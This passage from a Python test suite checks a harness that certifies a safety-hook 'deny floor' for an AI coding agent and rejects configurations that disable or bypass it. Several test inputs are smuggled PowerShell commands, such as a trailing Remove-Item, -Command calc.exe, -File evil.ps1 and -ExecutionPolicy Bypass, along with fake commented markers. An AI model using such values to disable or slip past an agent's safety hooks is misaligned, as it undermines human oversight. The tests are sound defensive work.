            system_requirements=("[feature_requirements]\n" "codex_hooks = false\n"),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("feature_requirements.codex_hooks=false", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_uses_canonical_required_hook_feature_precedence(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements=(
                "[features]\n" "codex_hooks = false\n" "hooks = true\n"
            ),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_requirements_hook_feature_schema_is_fail_closed(self) -> None:
        requirements = Path(self.temp.name) / "requirements.toml"
        invalid_documents = (
            '[features]\nhooks = "false"\n',
            "[features]\nhooks = true\n\n"
            "[feature_requirements]\ncodex_hooks = true\n",
            '[features]\nunknown_future_feature = "invalid"\n',
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                requirements.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.requirements_hook_feature_declaration(requirements)

    def test_doctor_accepts_explicit_hook_feature_enable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=("[features]\n" "codex_hooks = false\n" "hooks = true\n"),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_persisted_hook_feature_disables(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config="[features]\nhooks = false\n",
            system_config="[features]\ncodex_hooks = false\n",
            profile_configs={"custom.config.toml": "[features]\nhooks = false\n"},
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.hooks", output)
        self.assertIn("features.codex_hooks", output)

    def test_doctor_rejects_project_hook_feature_disable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            "[features]\nhooks = false\n", encoding="utf-8"
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_legacy_profile_selection(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='profile = "custom"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("legacy profile selection", output)

    def test_doctor_ignores_project_legacy_profile_selection(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            (
                'profile = "custom"\n\n'
                '[profiles.custom.features]\nhooks = "project-denylisted"\n'
            ),
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_inactive_legacy_profile_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=('[profiles.custom.features]\nfuture_feature = "invalid"\n'),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("profiles.custom", output)
        self.assertIn("must be a boolean", output)

    def test_hook_feature_profile_schema_is_fail_closed(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        invalid_documents = (
            "profiles = 7\n",
            "[profiles]\ncustom = 7\n",
            '[profiles.custom.features]\nfuture_feature = "invalid"\n',
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                config.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.hook_feature_declarations(
                        config, reject_legacy_profile=True
                    )

    def test_doctor_rejects_nonboolean_project_feature_sibling(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            '[features]\nfuture_feature = "invalid"\n', encoding="utf-8"
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.future_feature", output)
        self.assertIn("must be a boolean", output)

    def test_doctor_ignores_project_only_system_proxy_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            '[features]\nrespect_system_proxy = "project-denylisted"\n',
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_user_system_proxy_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='[features]\nrespect_system_proxy = "invalid"\n',
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.respect_system_proxy", output)
        self.assertIn("must be a boolean", output)

    def test_hook_feature_schema_accepts_structured_codex_features(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            """
[features]
hooks = true
future_feature = false

[features.code_mode]
enabled = true
excluded_tool_namespaces = ["mcp"]
direct_only_tool_namespaces = ["functions"]

[features.multi_agent_v2]
enabled = true
max_concurrent_threads_per_session = 4
min_wait_timeout_ms = 10000
max_wait_timeout_ms = 3600000
default_wait_timeout_ms = 30000
usage_hint_enabled = false
usage_hint_text = "hint"
root_agent_usage_hint_text = "root"
subagent_usage_hint_text = "subagent"
multi_agent_mode_hint_text = "mode"
tool_namespace = "collaboration"
hide_spawn_agent_metadata = true
expose_spawn_agent_model_overrides = true
non_code_mode_only = false

[features.token_budget]
enabled = true
reminder_threshold_tokens = 12000
reminder_message_template = "{n_remaining} remain"
guidance_message = "wrap up"
auto_compact_fallback_prompt = "record state"
auto_compact_fallback_buffer_tokens = 1000

[features.rollout_budget]
enabled = true
limit_tokens = 100000
reminder_at_remaining_tokens = [50000, 10000]
sampling_token_weight = 1.0
prefill_token_weight = 0.5

[features.current_time_reminder]
enabled = true
reminder_interval_seconds = 60
clock_source = "system"
delivery_mode = "after_user_or_tool_output"
sleep_tool = true

[features.apps_mcp_path_override]
enabled = false
path = "apps.json"

[features.network_proxy]
enabled = true
proxy_url = "http://127.0.0.1:8080"
enable_socks5 = true
socks_url = "socks5://127.0.0.1:1080"
enable_socks5_udp = false
allow_upstream_proxy = false
dangerously_allow_non_loopback_proxy = false
dangerously_allow_all_unix_sockets = false
mode = "limited"
allow_local_binding = true

[features.network_proxy.domains]
"example.com" = "allow"

[features.network_proxy.unix_sockets]
"/tmp/example.sock" = "deny"
""",
            encoding="utf-8",
        )

        declarations = harness.hook_feature_declarations(config)

        self.assertEqual(len(declarations), 1)
        self.assertTrue(declarations[0][1])

    def test_hook_feature_schema_rejects_malformed_structured_features(
        self,
    ) -> None:
        config = Path(self.temp.name) / "config.toml"
        invalid_documents = (
            "[features.code_mode]\nunknown = true\n",
            ("[features.multi_agent_v2]\n" "max_concurrent_threads_per_session = -1\n"),
            '[features.token_budget]\nreminder_threshold_tokens = "many"\n',
            (
                "[features.rollout_budget]\n"
                "reminder_at_remaining_tokens = [100, true]\n"
            ),
            '[features.current_time_reminder]\nclock_source = "local"\n',
            "[features.apps_mcp_path_override]\npath = 7\n",
            ("[features.network_proxy.domains]\n" '"example.com" = "prompt"\n'),
            "[features.network_proxy]\nunknown = true\n",
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                config.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.hook_feature_declarations(config)

    def test_doctor_ignores_managed_only_key_outside_requirements(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config="allow_managed_hooks_only = true\n"
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_disabled_canonical_floor_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        hooks_path = self.write_hooks(repo, valid_adapter).resolve()
        key = f"{hooks_path}:pre_tool_use:0:0"
        user_config = f"[hooks.state.{json.dumps(key)}]\nenabled = false\n"

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=user_config
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("enabled=false", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_disabled_logical_alias_floor_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        alias = Path(self.temp.name) / "repo-alias"
        remove_alias = self.make_directory_alias(repo, alias)
        try:
            with mock.patch.object(harness.os.path, "isjunction", None, create=True):
                self.assertTrue(harness.path_is_alias(alias))
            logical_hooks = alias / ".codex" / "hooks.json"
            self.assertNotEqual(logical_hooks, logical_hooks.resolve())
            key = f"{logical_hooks}:pre_tool_use:0:0"
            user_config = f"[hooks.state.{json.dumps(key)}]\nenabled = false\n"

            result, output = self.run_doctor_with_fixture_globals(
                alias, user_config=user_config
            )

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex project hook activation", output)
            self.assertIn(repr(key), output)
            self.assertIn("enabled=false", output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_rejects_cross_repo_logical_alias_topology(self) -> None:
        root = Path(self.temp.name)
        repo_a = root / "repo-a"
        repo_b = root / "repo-b"
        for repo in (repo_a, repo_b):
            subprocess.run(["git", "init", "-q", str(repo)], check=True)
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo_b, valid_adapter)
        target = repo_b / "subdir"
        target.mkdir()
        alias = repo_a / "linked-into-b"
        remove_alias = self.make_directory_alias(target, alias)
        try:
            result, output = self.run_doctor_with_fixture_globals(alias)

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex hook source", output)
            self.assertIn("logical Codex project root disagrees", output)
            self.assertIn(str(repo_a), output)
            self.assertIn(str(repo_b.resolve()), output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_rejects_same_repo_alias_with_different_ancestry(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        logical_parent = repo / "container"
        logical_config = logical_parent / ".codex" / "config.toml"
        logical_config.parent.mkdir(parents=True)
        logical_config.write_text("[features]\nhooks = false\n", encoding="utf-8")
        target = repo / "elsewhere" / "target"
        target.mkdir(parents=True)
        alias = logical_parent / "linked-target"
        remove_alias = self.make_directory_alias(target, alias)
        try:
            result, output = self.run_doctor_with_fixture_globals(alias)

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex hook source", output)
            self.assertIn("different project-layer ancestry", output)
            self.assertIn("container", output)
            self.assertIn("elsewhere", output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_ignores_unrelated_disabled_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        user_config = '[hooks.state."C:/other/hooks.json:pre_tool_use:0:0"]\n'
        user_config += "enabled = false\n"

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=user_config
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_sync_global_keeps_floor_project_local(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        codex_home.mkdir()
        (codex_home / "hooks.json").write_text(
            json.dumps(
                {
                    "hooks": {
                        "SessionStart": [
                            {"hooks": [{"type": "command", "command": "keep"}]}
                        ],
                        "PreToolUse": [
                            {
                                "hooks": [
                                    harness.canonical_legacy_codex_floor_handler(
                                        codex_home / "hooks" / "dispatch.py"
                                    )
                                ]
                            }
                        ],
                    }
                }
            ),
            encoding="utf-8",
        )
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            apply=True,
        )
        self.assertEqual(harness.sync_global(args), 0)
        hooks = json.loads((codex_home / "hooks.json").read_text(encoding="utf-8"))
        self.assertIn("SessionStart", hooks["hooks"])
        self.assertNotIn("PreToolUse", hooks["hooks"])
        harness_root = Path(harness.__file__).resolve().parent
        self.assertTrue(
            harness.same_file(
                harness_root / "templates" / "hooks" / "dispatch.py",
                claude_home / "hooks" / "dispatch.py",
            )
        )
        self.assertFalse((codex_home / "hooks" / "dispatch.py").exists())

    def test_sync_global_allows_absent_hooks_file(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        codex_home.mkdir()
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(root / "claude-home"),
            skills_home=str(root / "skills-home"),
            apply=False,
        )

        self.assertEqual(harness.sync_global(args), 0)
        self.assertFalse((codex_home / "hooks.json").exists())

    def test_sync_global_refuses_retained_custom_floor(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        codex_home.mkdir()
        original = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        "python D:/custom/dispatch.py --event pre "
                                        "--runtime codex"
                                    ),
                                }
                            ]
                        }
                    ]
                }
            }
        )
        hooks_path = codex_home / "hooks.json"
        hooks_path.write_text(original, encoding="utf-8")
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(root / "claude-home"),
            skills_home=str(root / "skills-home"),
            apply=True,
        )
        with self.assertRaises(harness.HarnessError):
            harness.sync_global(args)
        self.assertEqual(hooks_path.read_text(encoding="utf-8"), original)

    def test_sync_global_does_not_replace_identical_skill(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        source_skill = config_root / "codex" / "skills" / "sample"
        target_skill = root / "skills-home" / "sample"
        source_skill.mkdir(parents=True)
        target_skill.mkdir(parents=True)
        (config_root / "codex" / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        for skill in (source_skill, target_skill):
            (skill / "SKILL.md").write_text("# sample\n", encoding="utf-8")

        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(root / "codex-home"),
            claude_home=str(root / "claude-home"),
            skills_home=str(root / "skills-home"),
            apply=True,
        )
        with mock.patch.object(
            harness.shutil,
            "rmtree",
            side_effect=AssertionError("identical skill should not be removed"),
        ):
            self.assertEqual(harness.sync_global(args), 0)

        self.assertEqual(
            (target_skill / "SKILL.md").read_text(encoding="utf-8"), "# sample\n"
        )

    def test_sync_global_preserves_same_second_backup_sets(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        source_skill = codex_source / "skills" / "sample"
        source_skill.mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("canonical laws\n", encoding="utf-8")
        (source_skill / "SKILL.md").write_text("canonical skill\n", encoding="utf-8")

        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        (claude_home / "hooks").mkdir(parents=True)
        (skills_home / "sample").mkdir(parents=True)
        codex_home.mkdir()
        (codex_home / "AGENTS.md").write_text("original laws\n", encoding="utf-8")
        (claude_home / "hooks" / "dispatch.py").write_text(
            "original dispatcher\n", encoding="utf-8"
        )
        (claude_home / "hooks" / "smoke_test.py").write_text(
            "original smoke\n", encoding="utf-8"
        )
        (skills_home / "sample" / "SKILL.md").write_text(
            "original skill\n", encoding="utf-8"
        )
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            apply=True,
        )
        frozen = datetime(2026, 7, 14, 4, 0, tzinfo=timezone.utc)

        class FrozenDatetime:
            @classmethod
            def now(cls, _tz: object) -> datetime:
                return frozen

        with mock.patch.object(harness, "datetime", FrozenDatetime):
            self.assertEqual(harness.sync_global(args), 0)
            (codex_home / "AGENTS.md").write_text(
                "intermediate laws\n", encoding="utf-8"
            )
            (skills_home / "sample" / "SKILL.md").write_text(
                "intermediate skill\n", encoding="utf-8"
            )
            self.assertEqual(harness.sync_global(args), 0)

        first = codex_home / "backups" / "20260714T040000Z"
        second = codex_home / "backups" / "20260714T040000Z-01"
        self.assertEqual(
            (first / "AGENTS.md").read_text(encoding="utf-8"), "original laws\n"
        )
        self.assertEqual(
            (second / "AGENTS.md").read_text(encoding="utf-8"),
            "intermediate laws\n",
        )
        first_skill = skills_home / ".harness-backups" / first.name / "sample"
        second_skill = skills_home / ".harness-backups" / second.name / "sample"
        self.assertEqual(
            (first_skill / "SKILL.md").read_text(encoding="utf-8"),
            "original skill\n",
        )
        self.assertEqual(
            (second_skill / "SKILL.md").read_text(encoding="utf-8"),
            "intermediate skill\n",
        )

    def test_repo_floor_finds_direct_and_hardened_adapters(self) -> None:
        direct = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        "python $HOME/.claude/hooks/dispatch.py "
                        "--event pre --runtime codex"
                    ),
                    "commandWindows": (
                        "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                        "--event=pre --runtime=codex"
                    ),
                }
            ],
        }
        wrapped = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        "dispatcher=$HOME/.claude/hooks/dispatch.py; "
                        "/bin/sh .codex/invoke_deny_floor.sh"
                    ),
                    "commandWindows": (
                        "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                        "& .codex/invoke_deny_floor.ps1"
                    ),
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [direct, wrapped]}})
        self.assertEqual(harness.repo_codex_floor_groups(current), [direct, wrapped])

    def test_repo_floor_decodes_windows_command_and_binds_pin(self) -> None:
        pin = "a" * 64
        windows_script = (
            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(windows_script.encode("utf-16-le")).decode("ascii")
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                        "/bin/sh .codex/invoke_deny_floor.sh"
                    ),
                    "commandWindows": f"powershell -EncodedCommand {encoded}",
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])
        self.assertEqual(harness.repo_codex_floor_groups(current, "b" * 64), [])

    def test_repo_floor_rejects_encoded_command_trailing_statement(self) -> None:
        # An outer statement after -EncodedCommand runs but would be hidden by
        # the decoded inner text; the certifier must fail closed on any tail.
        pin = "a" * 64
        inner = (
            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
        posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        for tail in (
            "; Remove-Item -Recurse -Force x",
            " & Remove-Item x",
            "\nRemove-Item x",
        ):
            with self.subTest(tail=tail):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell -EncodedCommand {encoded}{tail}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        # trailing whitespace after the payload is harmless and still certifies
        ok_group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": f"powershell -EncodedCommand {encoded}  ",
                }
            ],
        }
        ok_current = json.dumps({"hooks": {"PreToolUse": [ok_group]}})
        self.assertEqual(len(harness.repo_codex_floor_groups(ok_current, pin)), 1)

    def test_repo_floor_rejects_code_directive_before_encoded_command(self) -> None:
        # A -Command/-File/-CommandWithArgs (or unknown option) BEFORE
        # -EncodedCommand slurps/redefines execution so the encoded payload never
        # runs as PowerShell; the decoded inner text would hide the real command.
        pin = "a" * 64
        inner = (
            f"$expected='{pin}';"
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py';"
            "& .codex/invoke_deny_floor.ps1"
        )
        encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
        posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        for prefix in (
            "-Command calc.exe",
            "-c calc.exe",
            "-File evil.ps1",
            "-f evil.ps1",
            "-CommandWithArgs foo",
            "-cwa foo",
            "-WeirdUnknown x",
            # a bare positional binds to the implicit -Command and runs itself,
            # demoting -EncodedCommand to an inert argument
            "C:\\evil\\payload.exe",
            "calc.exe",
            "-WindowStyle Hidden calc.exe",
            "-EncodedCommand:",
            "-NoProfile:true",
            "-ExecutionPolicy:Bypass",
            "-NoLogo:",
            "-n",
            "-i",
        ):
            with self.subTest(prefix=prefix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell {prefix} -EncodedCommand {encoded}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        # Even familiar options before -EncodedCommand are outside the strict
        # two-token proof shape and must fail closed.
        for prefix in (
            "-NoProfile",
            "-NoLogo -NonInteractive",
            "-ExecutionPolicy Bypass",
            "-NoExit",
            "-OutputFormat XML",
        ):
            with self.subTest(prefix=prefix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": f"powershell {prefix} -EncodedCommand {encoded}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

        attached_group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": f"powershell -EncodedCommand:{encoded}",
                }
            ],
        }
        attached = json.dumps({"hooks": {"PreToolUse": [attached_group]}})
        self.assertEqual(harness.repo_codex_floor_groups(attached, pin), [])

    def test_repo_floor_requires_both_platforms_and_positive_matcher(self) -> None:
        handler = {
            "type": "command",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": "Write-Output floor-disabled",
        }
        for matcher in ("^NotBash$", "^(?!Bash$).*$", "bash"):
            with self.subTest(matcher=matcher):
                current = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": matcher, "hooks": [handler]}]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(current), [])
        current = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(current), [])

    def test_repo_floor_requires_single_handler_group_and_pin(self) -> None:
        pin = "c" * 64
        valid = {
            "type": "command",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": (
                "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        pin_only = {
            "type": "command",
            "command": f"echo {pin}",
            "commandWindows": f"Write-Output {pin}",
        }
        group = {"matcher": "^Bash$", "hooks": [valid, pin_only]}
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current), [])
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

        duplicate = {"matcher": "^Bash$", "hooks": [valid, dict(valid)]}
        duplicate_text = json.dumps({"hooks": {"PreToolUse": [duplicate]}})
        self.assertEqual(harness.repo_codex_floor_groups(duplicate_text), [])
        self.assertEqual(len(harness.repo_codex_floor_candidates(duplicate_text)), 2)

        broken = {
            "type": "command",
            "command": valid["command"],
            "commandWindows": "Write-Output disabled",
        }
        mixed = {"matcher": "^Bash$", "hooks": [valid, broken]}
        mixed_text = json.dumps({"hooks": {"PreToolUse": [mixed]}})
        self.assertEqual(harness.repo_codex_floor_groups(mixed_text), [])
        self.assertEqual(len(harness.repo_codex_floor_candidates(mixed_text)), 2)

    def test_repo_floor_rejects_non_floor_sibling_handler(self) -> None:
        pin = "7" * 64
        floor = {
            "type": "command",
            "command": (
                f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
            "commandWindows": (
                f"$expected='{pin}'; py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        single = {"matcher": "^Bash$", "hooks": [floor]}
        single_text = json.dumps({"hooks": {"PreToolUse": [single]}})
        self.assertEqual(harness.repo_codex_floor_groups(single_text, pin), [single])

        sibling = {
            "type": "command",
            "command": "python .codex/audit_command.py",
            "commandWindows": "py -3 .codex/audit_command.py",
        }
        combined = {"matcher": "^Bash$", "hooks": [floor, sibling]}
        combined_text = json.dumps({"hooks": {"PreToolUse": [combined]}})
        self.assertEqual(len(harness.repo_codex_floor_candidates(combined_text)), 1)
        self.assertEqual(harness.repo_codex_floor_groups(combined_text, pin), [])

    def test_repo_floor_rejects_data_only_markers(self) -> None:
        pin = "d" * 64
        marker_text = f"{pin} .claude/hooks/dispatch.py invoke_deny_floor"
        encoded = base64.b64encode(marker_text.encode("utf-16-le")).decode("ascii")
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": f"echo '{marker_text}'",
                    "commandWindows": f"echo -EncodedCommand {encoded}",
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_commented_and_chained_markers(self) -> None:
        pin = "e" * 64
        marker = (
            "python $HOME/.claude/hooks/dispatch.py "
            f"--event pre --runtime codex expected={pin}"
        )
        carriers = (
            (
                f"python -c pass # {marker}",
                f"py -3 -c pass # {marker}",
            ),
            (
                f"python -c pass; echo {marker}",
                f"py -3 -c pass; Write-Output {marker}",
            ),
        )
        for command, command_windows in carriers:
            with self.subTest(command=command):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_posix_invocation_control_operators(self) -> None:
        pin = "1" * 64
        invocation = (
            "python $HOME/.claude/hooks/dispatch.py " "--event pre --runtime codex"
        )
        windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        suffixes = (
            "< /dev/null",
